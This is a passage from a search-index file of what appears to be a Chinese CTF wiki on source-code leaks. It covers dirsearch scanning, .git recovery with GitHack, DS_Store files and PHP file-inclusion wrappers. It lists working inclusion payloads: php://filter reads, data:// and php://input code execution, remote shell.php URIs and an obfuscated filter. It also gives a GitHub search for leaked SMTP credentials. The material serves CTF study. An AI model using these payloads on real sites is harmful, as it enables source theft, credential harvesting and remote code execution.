e73\u53f0\u6258\u7ba1\uff0c\u901a\u8fc7\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53ef\u4ee5\u627e\u5230\u5173\u4e8e\u76ee\u6807\u7ad9\u70b9\u7684\u654f\u611f\u4fe1\u606f\uff0c\u751a\u81f3\u53ef\u4ee5\u4e0b\u8f7d\u7f51\u7ad9\u6e90\u7801\u3002</p> <p>\u7c7b\u4f3c\u7684\u4ee3\u7801\u6258\u7ba1\u5e73\u53f0\u8fd8\u6709\u5f88\u591a\uff0c\u4eba\u624d\u662f\u6700\u5927\u7684\u6f0f\u6d1e\u3002</p> <p><pre><code>https://github.com/search?q=smtp+user+@qq.com&amp;type=code\n</code></pre> \u53c2\u8003\u94fe\u63a5\uff1a https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_19</p> <p>https://evilpan.com/2017/09/22/web-file-disclosure/</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","title":"\u6e90\u7801\u6cc4\u9732","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5f88\u5c11\u5f88\u5c11\u4f1a\u78b0\u5230flag\u653e\u5728\u6cc4\u9732\u51fa\u6765\u7684\u6e90\u7801\u91cc\u9762</p> <p>\u4e00\u822c\u90fd\u662f\u4ee3\u7801\u5ba1\u8ba1\uff0c\u6240\u4ee5\u4f1a\u548c\u5176\u4ed6\u5f88\u591a\u4e1c\u897f\u4ea4\u7ec7\u5728\u4e00\u8d77\uff0c\u5c5e\u4e8e\u4e00\u4e2a\u6bd4\u8f83\u4e2d\u95f4\u7684\u6a21\u5757\u3002</p> <p>\u6240\u4ee5\u8fd9\u91cc\u5e94\u8be5\u662f\u4e0d\u4f1a\u6709\u4ec0\u4e48\u4f8b\u5b50\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#dirsearch","title":"dirsearch","text":"<p>\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8f6f\u4ef6\u7684\u540d\u79f0\uff0c\u7528\u6765\u626b\u540e\u53f0\u8def\u5f84\u7684\uff0c\u8bb2\u4e0d\u597d\u53ef\u4ee5\u626b\u51fa\u6e90\u7801\u3002</p> <p>\u5fa1\u5251\u6211\u6ca1\u7528\u8fc7hhh</p> <p>\uff08\u4f46\u662fbuu\u6709\u8bbf\u95ee\u9650\u5236\u4f1a\u7ecf\u5e38429.......\u6240\u4ee5\u8bb0\u5f97\u52a0\u53c2\u6570\uff09</p> <p>\u653e\u4e0a\u4e0b\u8f7d\u94fe\u63a5</p> <p>https://github.com/maurosoria/dirsearch</p> <p>git clone\u4e0b\u8f7d\u5c31\u80fd\u7528\u4e86\u8bb0\u5f97chmod +x</p> <p>\u7136\u540e\u7528\u6cd5\u4e00\u822c\u662f</p> <p>./dirsearch -u URL -x 404,429,500...(\u770b\u9700\u6c42) -t 5(\u7ebf\u7a0b\u6570) -d 0.1(\u8bbf\u95ee\u5ef6\u8fdf)</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#git","title":".git\u6e90\u7801\u6cc4\u9732","text":"<p>\u5f00\u53d1\u4eba\u5458\u4f1a\u4f7f\u7528 git \u8fdb\u884c\u7248\u672c\u63a7\u5236\uff0c\u5bf9\u7ad9\u70b9\u81ea\u52a8\u90e8\u7f72\u3002\u4f46\u5982\u679c\u914d\u7f6e\u4e0d\u5f53\uff0c\u53ef\u80fd\u4f1a\u5c06 .git \u6587\u4ef6\u5939\u76f4\u63a5\u90e8\u7f72\u5230\u7ebf\u4e0a\u73af\u5883\uff0c\u8fd9\u5c31\u5f15\u8d77\u4e86 git \u6cc4\u9732\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u76f4\u63a5\u83b7\u5f97\u7f51\u9875\u6e90\u7801\u3002</p> <p>\u901a\u8fc7\u7f51\u9875\u8bbf\u95ee .git \u76ee\u5f55\uff0c\u5982\u679c\u80fd\u8bbf\u95ee\u5c31\u8bf4\u660e\u5b58\u5728\uff08\u6743\u9650\u4e0d\u591f\u4e5f\u884c\uff09</p> <p>\u8981\u83b7\u53d6\u6cc4\u9732\u7684\u6e90\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528 GitHack \u5de5\u5177</p> <p>python\uff082\uff09 GitHack.py url</p> <p>\u4e0b\u8f7d\u5b8c\u4e4b\u540e\u7684\u5de5\u4f5c\u57fa\u672c\u4e0a\u662f\u4ee3\u7801\u5ba1\u8ba1\u3002</p> <p>https://github.com/BugScanTeam/GitHack</p> <p>\u9700\u8981\u6ce8\u610f\u7684\uff0c\u8c8c\u4f3c\u6211\u89c1\u8fc7\u7684\u90fd\u662fpy2\u5199\u7684\uff0c\u6240\u4ee5\u9700\u8981py2\u8c03\u7528</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#git_1","title":"git\u6587\u4ef6\u4fee\u590d","text":"<p><code>git log --all</code></p> <p>\u4e00\u4e2a\u662f\u663e\u793a</p> <p><code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></p> <p>\u4e00\u4e2a\u662f\u6062\u590d</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#ds_store","title":"ds_store","text":"<p>\u5728Mac OS\u4e0a\u4f1a\u5b58\u5728\u3002</p> <p>DS_Store \u662f\u7528\u6765\u5b58\u50a8\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u663e\u793a\u5c5e\u6027\u7684\uff1a\u6bd4\u5982\u6587\u4ef6\u56fe\u6807\u7684\u6446\u653e\u4f4d\u7f6e\u3002\u5220\u9664\u4ee5\u540e\u7684\u526f\u4f5c\u7528\u5c31\u662f\u8fd9\u4e9b\u4fe1\u606f\u7684\u5931\u53bb\u3002\uff08\u5f53\u7136\uff0c\u8fd9\u70b9\u526f\u4f5c\u7528\u5176\u5b9e\u4e0d\u662f\u592a\u5927\uff09</p> <p>\u4e3b\u8981\u662f\u5982\u679c\u62ff\u5230\u4e86\u8fd9\u4e2a\u6587\u4ef6\u7531\u4e8e\u5404\u79cd\u7f16\u7801\u7684\u539f\u56e0\u4f1a\u5f88\u96be\u53d7</p> <p>\u4e8e\u662f\u7ed9\u51fa\u4e00\u4e2a\u89e3\u6790\u8bfb\u53d6\u8fd9\u7c7b\u6587\u4ef6\u7684\u811a\u672c\uff1a</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#php","title":"php\u4f2a\u534f\u8bae","text":"<p>\u5176\u5b9e\u8fd9\u4e2a\u4e1c\u897f\u5e94\u8be5\u653e\u5728\u6587\u4ef6\u5305\u542b\u548c\u6587\u4ef6\u4e0a\u4f20\u91cc\u9762\u7684\u3002\u7ea0\u7ed3\u4e86\u4e00\u4e0b\uff0c\u4f46\u8fd8\u662f\uff0c\u51b3\u5b9a\u4e24\u4e2a\u5730\u65b9\u90fd\u653e\u7740(\u4e0d\u8fc7\u4e0d\u4f1a\u653e\u5f88\u591a\uff0c\u5927\u5934\u8fd8\u662f\u653e\u5728\u90a3\u8fb9)\uff1a</p> <p>include\u3001require\u3001include_once\u3001require_once\u3001highlight_file \u3001show_source \u3001readfile \u3001file_get_contents \u3001fopen \u3001file</p> <p>\u8fd9\u4e9b\u90fd\u662f\u5e38\u89c1\u7684\u6587\u4ef6\u5305\u542b\u51fd\u6570\u4f2a\u534f\u8bae\u4f9d\u6258\u4e8e\u8fd9\u4e9b\u51fd\u6570\u6765\u6267\u884c\u3002\u3002</p> <p>\u4ee5\u5e38\u89c1\u7684include\u4e3a\u4f8b\u597d\u4e86</p> <p>\u6700\u957f\u4f7f\u7528\u7684\u4e3aphp://filter/read=convert.base64-encode/resource=[\u6587\u4ef6\u540d]\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\uff08\u9488\u5bf9php\u6587\u4ef6\u9700\u8981base64\u7f16\u7801\uff09</p> <p>\u4f1a\u78b0\u5230include($_GET['NAME'])</p> <p>\u7136\u540e\u4f60\u4f20\u4e2a?NAME=php://filter/read=convert.base64-encode/resource=index.php</p> <p>\u8fdb\u53bb\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u62ff\u5230index.php\u7684base64\u7f16\u7801\u7684\u6e90\u7801\u3002</p> <p>\u539f\u7406\u5c31\u662f\u6587\u4ef6\u5305\u542b\uff08\u4e4b\u540e\u4ecb\u7ecd\uff09</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#php_1","title":"php\u652f\u6301\u7684\u4f2a\u534f\u8bae\u6709\uff1a","text":"<pre><code>ftp://shell.php\nfile:///tmp/shell.php\nhttp://xxxx/shell.php\n\\\\smbserver\\shell.php        //unc\u8def\u5f84\nphar://xxxx/x.zip/shell.php   //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nzip://xxxx/x.zip#shell.php    //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nphp://filter/read=convert.base64-encode/resource=shell.php\ncompress.bzip2://shell.php\ncompress.zlib://shell.jpg\nphp://input    [POST DATA] &lt;?php phpinfo()?&gt;\ndata://text/plain,&lt;?php phpinfo()?&gt;                 //\u4e5f\u53ef\u4ee5data:text/plain,&lt;?php phpinfo()?&gt;\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nphp://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\nphp://filter/%72ead=convert.base64-encode/resource=shell.%70hp\nPlain Text\n</code></pre> <p>\u8bfb\u6587\u4ef6\u5e38\u7528\u7684\u4e5f\u5c31php\uff1a\uff08\u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\uff09</p> <p>\u548cfile:\uff08\u8fd8\u6709local_file,\u8fd9\u4e2a\u4e4b\u540e\u518d\u8bf4\uff0c\u597d\u50cf\u662f\u4e2acve\uff09</p> <p>\u6240\u8c13\u7684\u4f2a\u534f\u8bae\uff0c\u4e8b\u5b9e\u4e0a\u662f\u5176\u652f\u6301\u7684\u534f\u8bae\u4e0e\u5c01\u88c5\u534f\u8bae</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/#google","title":"google","text":"<p>\u6709\u4e9b\u4ee3\u7801\uff08\u6bd4\u5982\u8bf4\u76f4\u63a5\u7684\u670d\u52a1\u5668\u7aef\u6846\u67b6\u6027\u7684\uff09\u8bd5\u80fd\u591f\u76f4\u63a5\u7528github\u548cgoogle\u76f4\u63a5\u641c\u7d22\u5230\u7684</p> <p>\u56e0\u6b64\u8fd9\u4e5f\u662f\u4e00\u79cd\u5f62\u5f0f\u4e0a\u7684\u6e90\u7801\u6cc4\u9732\u3002</p>"}]}